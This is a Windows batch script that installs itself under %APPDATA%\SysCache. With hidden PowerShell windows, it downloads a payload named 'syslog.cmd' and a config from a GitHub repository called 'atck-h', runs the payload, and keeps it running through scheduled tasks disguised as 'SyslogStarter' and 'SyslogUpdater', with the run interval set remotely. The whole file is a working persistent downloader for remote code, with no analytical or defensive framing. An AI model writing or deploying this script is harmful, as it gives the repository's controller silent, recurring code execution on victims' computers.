@echo off
setlocal enabledelayedexpansion

:: ============================================================
:: Configuration
:: ============================================================
set "BASE=%APPDATA%\SysCache"
set "UPDATER=%BASE%\updater.cmd"
set "PRANK=%BASE%\syslog.cmd"
set "LOCAL_VER=%BASE%\local_version.txt"
set "LOCAL_INTERVAL=%BASE%\interval.txt"
set "INSTALL_FLAG=%BASE%\installed.flag"
set "PENDING_FLAG=%BASE%\pending.flag"
set "LOG=%BASE%\install.log"

:: Create log file (overwrite each run)
echo %DATE% %TIME% - Starting updater > "%LOG%"

set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "CONFIG_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/config.txt"

set "REMOTE_VER=%TEMP%\rv.txt"
set "DOWNLOAD=%TEMP%\sn.cmd"
set "CONFIG=%TEMP%\config.txt"

:: Default values (if GitHub unreachable)
set "DEFAULT_INIT_DELAY=5"
set "DEFAULT_INTERVAL=5"

:: ============================================================
:: Create base folder if missing
:: ============================================================
if not exist "%BASE%" (
    mkdir "%BASE%"
    echo %DATE% %TIME% - Created BASE folder >> "%LOG%"
)

:: ============================================================
:: Ensure this script resides in BASE as updater.cmd
:: ============================================================
if /i not "%~f0"=="%UPDATER%" (
    copy /Y "%~f0" "%UPDATER%" >> "%LOG%" 2>&1
    echo %DATE% %TIME% - Copied updater to BASE >> "%LOG%"
)

:: ============================================================
:: First installation? (flag absent)
:: ============================================================
if not exist "%INSTALL_FLAG%" goto FIRST_INSTALL

:: ============================================================
:: Normal execution – check for argument
:: ============================================================
if "%1"=="--first-run" goto FIRST_RUN_TRIGGERED

:: -----------------------------------------------------------------
:: RECURRING RUN (triggered by the minute-interval task)
:: -----------------------------------------------------------------
echo %DATE% %TIME% - Recurring run >> "%LOG%"

if exist "%PENDING_FLAG%" (
    echo %DATE% %TIME% - Pending flag exists, exiting >> "%LOG%"
    goto :EOF
)

:: Download remote version and config silently
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VER%' -ErrorAction Stop } catch {}" >> "%LOG%" 2>&1
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >> "%LOG%" 2>&1

:: ---------- Update payload if newer version exists ----------
set "REMOTE="
if exist "%REMOTE_VER%" set /p REMOTE=<"%REMOTE_VER%"
if exist "%LOCAL_VER%" set /p LOCAL=<"%LOCAL_VER%"

if not "!LOCAL!"=="!REMOTE!" (
    echo %DATE% %TIME% - New version detected: !REMOTE! >> "%LOG%"
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD%' -ErrorAction Stop } catch {}" >> "%LOG%" 2>&1
    if exist "%DOWNLOAD%" (
        move /Y "%DOWNLOAD%" "%PRANK%" >> "%LOG%" 2>&1
        echo !REMOTE! > "%LOCAL_VER%"
        echo %DATE% %TIME% - Updated syslog.cmd >> "%LOG%"
    )
)

:: ---------- Check if interval changed ----------
set "REMOTE_INTERVAL="
if exist "%CONFIG%" (
    set "line=0"
    for /f "usebackq delims=" %%a in ("%CONFIG%") do (
        set /a line+=1
        if !line! equ 2 (
            set "raw=%%a"
            for /f "delims=" %%d in ('echo !raw! ^| findstr /r "[0-9][0-9]*"') do set "REMOTE_INTERVAL=%%d"
        )
    )
)
if not defined REMOTE_INTERVAL set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"
echo !REMOTE_INTERVAL!| findstr /r "^[0-9][0-9]*$" >nul || set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"

if exist "%LOCAL_INTERVAL%" (
    set /p LOCAL_INTERVAL=<"%LOCAL_INTERVAL%"
    for /f "delims=" %%e in ('echo !LOCAL_INTERVAL! ^| findstr /r "[0-9][0-9]*"') do set "LOCAL_INTERVAL=%%e"
    echo !LOCAL_INTERVAL!| findstr /r "^[0-9][0-9]*$" >nul || set "LOCAL_INTERVAL="
) else (
    set "LOCAL_INTERVAL="
)

if not "!LOCAL_INTERVAL!"=="!REMOTE_INTERVAL!" (
    echo %DATE% %TIME% - Interval changed from !LOCAL_INTERVAL! to !REMOTE_INTERVAL! >> "%LOG%"
    schtasks /delete /tn "SyslogUpdater" /f >> "%LOG%" 2>&1
    schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /ru %USERNAME% /f >> "%LOG%" 2>&1
    if !errorlevel! equ 0 (
        echo %DATE% %TIME% - SyslogUpdater task created successfully >> "%LOG%"
    ) else (
        echo %DATE% %TIME% - Failed to create SyslogUpdater task >> "%LOG%"
    )
    echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"
)

:: ---------- Run the payload ----------
if exist "%PRANK%" (
    echo %DATE% %TIME% - Starting syslog.cmd >> "%LOG%"
    start "" "%PRANK%"
)

goto :EOF

:: ============================================================
:: FIRST INSTALL
:: ============================================================
:FIRST_INSTALL
echo %DATE% %TIME% - First install >> "%LOG%"

:: Download config
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >> "%LOG%" 2>&1

set "INIT_DELAY="
set "REMOTE_INTERVAL="
if exist "%CONFIG%" (
    set "line=0"
    for /f "usebackq delims=" %%a in ("%CONFIG%") do (
        set /a line+=1
        if !line! equ 1 (
            set "raw=%%a"
            for /f "delims=" %%d in ('echo !raw! ^| findstr /r "[0-9][0-9]*"') do set "INIT_DELAY=%%d"
        ) else if !line! equ 2 (
            set "raw=%%a"
            for /f "delims=" %%d in ('echo !raw! ^| findstr /r "[0-9][0-9]*"') do set "REMOTE_INTERVAL=%%d"
        )
    )
)
if not defined INIT_DELAY set "INIT_DELAY=%DEFAULT_INIT_DELAY%"
if not defined REMOTE_INTERVAL set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"
echo !INIT_DELAY!| findstr /r "^[0-9][0-9]*$" >nul || set "INIT_DELAY=%DEFAULT_INIT_DELAY%"
echo !REMOTE_INTERVAL!| findstr /r "^[0-9][0-9]*$" >nul || set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"

echo %DATE% %TIME% - INIT_DELAY=!INIT_DELAY!, REMOTE_INTERVAL=!REMOTE_INTERVAL! >> "%LOG%"

:: Store interval
echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"

:: Create pending flag
echo Pending > "%PENDING_FLAG%"

:: Calculate start time
for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('HH:mm')"') do set "START_TIME=%%i"
for /f %%i in ('powershell -Command "$d=(Get-Date).AddMinutes(!INIT_DELAY!); $d.ToString('MM/dd/yyyy')"') do set "START_DATE=%%i"
echo %DATE% %TIME% - Calculated start: %START_DATE% %START_TIME% >> "%LOG%"

:: Create one-time task
schtasks /create /tn "SyslogStarter" /sc once /st %START_TIME% /sd %START_DATE% /tr "cmd /c start /min \"\" \"%UPDATER%\" --first-run" /ru %USERNAME% /f >> "%LOG%" 2>&1
if !errorlevel! equ 0 (
    echo %DATE% %TIME% - SyslogStarter task created successfully >> "%LOG%"
) else (
    echo %DATE% %TIME% - Failed to create SyslogStarter task >> "%LOG%"
)

:: Mark installation as done
echo Installed > "%INSTALL_FLAG%"
echo %DATE% %TIME% - Installation complete >> "%LOG%"

goto :EOF

:: ============================================================
:: FIRST RUN TRIGGERED
:: ============================================================
:FIRST_RUN_TRIGGERED
echo %DATE% %TIME% - First run triggered >> "%LOG%"

del "%PENDING_FLAG%" 2>nul

:: Download fresh config
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%CONFIG_URL%' -OutFile '%CONFIG%' -ErrorAction Stop } catch {}" >> "%LOG%" 2>&1

set "REMOTE_INTERVAL="
if exist "%CONFIG%" (
    set "line=0"
    for /f "usebackq delims=" %%a in ("%CONFIG%") do (
        set /a line+=1
        if !line! equ 2 (
            set "raw=%%a"
            for /f "delims=" %%d in ('echo !raw! ^| findstr /r "[0-9][0-9]*"') do set "REMOTE_INTERVAL=%%d"
        )
    )
)
if not defined REMOTE_INTERVAL set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"
echo !REMOTE_INTERVAL!| findstr /r "^[0-9][0-9]*$" >nul || set "REMOTE_INTERVAL=%DEFAULT_INTERVAL%"

echo !REMOTE_INTERVAL! > "%LOCAL_INTERVAL%"

:: Run payload
if exist "%PRANK%" (
    echo %DATE% %TIME% - Starting syslog.cmd (first run) >> "%LOG%"
    start "" "%PRANK%"
)

:: Create recurring task
schtasks /delete /tn "SyslogUpdater" /f >> "%LOG%" 2>&1
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%UPDATER%\"" /sc minute /mo !REMOTE_INTERVAL! /ru %USERNAME% /f >> "%LOG%" 2>&1
if !errorlevel! equ 0 (
    echo %DATE% %TIME% - SyslogUpdater task created successfully >> "%LOG%"
) else (
    echo %DATE% %TIME% - Failed to create SyslogUpdater task >> "%LOG%"
)

:: Clean up starter task
schtasks /delete /tn "SyslogStarter" /f >> "%LOG%" 2>&1

echo %DATE% %TIME% - First run completed >> "%LOG%"
goto :EOF